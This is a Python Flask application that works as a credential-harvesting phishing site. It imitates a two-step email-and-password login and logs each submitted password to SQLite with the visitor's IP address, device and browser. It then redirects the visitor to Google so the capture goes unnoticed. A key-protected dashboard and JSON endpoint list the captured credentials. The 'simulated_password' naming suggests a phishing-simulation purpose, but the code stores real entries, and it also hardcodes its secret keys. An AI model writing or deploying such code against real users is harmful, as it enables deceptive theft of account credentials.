# app.py
from flask import Flask, render_template, request, redirect, session, jsonify
import os
import sqlite3
from datetime import datetime, timedelta 
import re 
from user_agents import parse 

app = Flask(__name__)
app.secret_key = 'your_very_secret_key_12345'
DB_PATH = "/tmp/database.db"
ADMIN_KEY = os.environ.get("ADMIN_KEY", "change-this")

def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    with sqlite3.connect(DB_PATH) as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                simulated_password TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                time_spent_sec REAL, 
                os_name TEXT,            
                browser_name TEXT,       
                timestamp TEXT NOT NULL
            );
        ''')
        existing_columns = {
            row[1] for row in conn.execute("PRAGMA table_info(credentials)").fetchall()
        }
        if "simulated_password" not in existing_columns:
            conn.execute(
                "ALTER TABLE credentials ADD COLUMN simulated_password TEXT"
            )
        if "password" in existing_columns:
            conn.execute("""
                UPDATE credentials
                SET simulated_password = COALESCE(simulated_password, password)
                WHERE simulated_password IS NULL
            """)
        conn.commit()

def get_db_connection():
    init_db()
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def get_stats(conn):
    cur = conn.cursor()
    
    total_records = cur.execute("SELECT COUNT(id) FROM credentials").fetchone()[0]
    
    desktop_sources = cur.execute("""
        SELECT COUNT(id) FROM credentials 
        WHERE os_name LIKE '%Desktop%'
    """).fetchone()[0]
    
    unique_sources = cur.execute("SELECT COUNT(DISTINCT ip_address) FROM credentials").fetchone()[0]
    
    last_capture_time = cur.execute("SELECT MAX(timestamp) FROM credentials").fetchone()[0]
    
    avg_time_spent = cur.execute("SELECT AVG(time_spent_sec) FROM credentials WHERE time_spent_sec IS NOT NULL").fetchone()[0]
    
    return {
        'total': total_records,
        'desktop': desktop_sources,
        'sources': unique_sources,
        'avg_time': round(avg_time_spent, 1) if avg_time_spent else 0,
        'last_capture': last_capture_time
    }


@app.route('/')
def home():
    session['start_time'] = datetime.now().isoformat()
    return render_template('login_email.html', error=None)

@app.route('/submit_email', methods=['POST'])
def submit_email():
    username = request.form.get('username')
    
    email_phone_regex = r'(^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$)|(^\+?\d{7,15}$)'
    
    if re.match(email_phone_regex, username):
        session['username'] = username
        return render_template('login_password.html', username=username)
    else:
        error_message = "Please enter a valid email address or phone number."
        return render_template('login_email.html', error=error_message)

@app.route('/submit_password', methods=['POST'])
def submit_password():
    init_db()
    username = session.get('username', 'not_found')
    simulated_password = request.form.get('password')
    timestamp = datetime.now().isoformat()
    
    ip_address = request.remote_addr 
    user_agent = request.headers.get('User-Agent')
    
    ua = parse(user_agent)
    os_name = f"{ua.os.family} ({'Mobile' if ua.is_mobile else 'Desktop'})"
    browser_name = f"{ua.browser.family} {ua.browser.version_string.split('.')[0]}"
    
    start_time_str = session.pop('start_time', None)
    time_spent = None
    if start_time_str:
        start_time = datetime.fromisoformat(start_time_str)
        time_spent = (datetime.now() - start_time).total_seconds()
    
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute("""
                INSERT INTO credentials (username, simulated_password, ip_address, user_agent, time_spent_sec, os_name, browser_name, timestamp) 
                VALUES (?,?,?,?,?,?,?,?)
            """, (username, simulated_password, ip_address, user_agent, time_spent, os_name, browser_name, timestamp))
            conn.commit()
            print(f"[SUCCESS] Record saved. Device: {os_name} / {browser_name}")
    except Exception as e:
        print(f"[ERROR] Could not save to database: {e}")
        session.pop('username', None)
        return "Unable to process your request right now.", 500
    
    session.pop('username', None)
    return redirect("https://www.google.com")

@app.route('/results')
def results():
    if request.args.get("key") != ADMIN_KEY:
        return "Not Found", 404

    session["admin_authenticated"] = True

    try:
        with get_db_connection() as conn:
            stats = get_stats(conn)
            rows = conn.execute("""
                SELECT
                    id,
                    username,
                    simulated_password AS password,
                    ip_address,
                    user_agent,
                    time_spent_sec,
                    os_name,
                    browser_name,
                    timestamp
                FROM credentials
                ORDER BY timestamp DESC
            """).fetchall()
        return render_template("results.html", rows=rows, stats=stats, datetime=datetime, timedelta=timedelta)
    except Exception as e:
        print(f"[ERROR] Could not load results: {e}")
        return "Dashboard is temporarily unavailable.", 500

@app.route('/data/json')
def get_data_json():
    if not session.get("admin_authenticated"):
        return jsonify({'error': 'Unauthorized'}), 403

    try:
        with get_db_connection() as conn:
            stats = get_stats(conn)
            rows_list = [
                dict(row) for row in conn.execute("""
                    SELECT
                        id,
                        username,
                        simulated_password AS password,
                        ip_address,
                        user_agent,
                        time_spent_sec,
                        os_name,
                        browser_name,
                        timestamp
                    FROM credentials
                    ORDER BY timestamp DESC
                """).fetchall()
            ]
        return jsonify({
            'rows': rows_list,
            'stats': stats,
            'current_time': datetime.now().isoformat()
        })
    except Exception as e:
        print(f"[ERROR] Could not load JSON data: {e}")
        return jsonify({'error': 'Dashboard data is temporarily unavailable.'}), 500

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=5000)
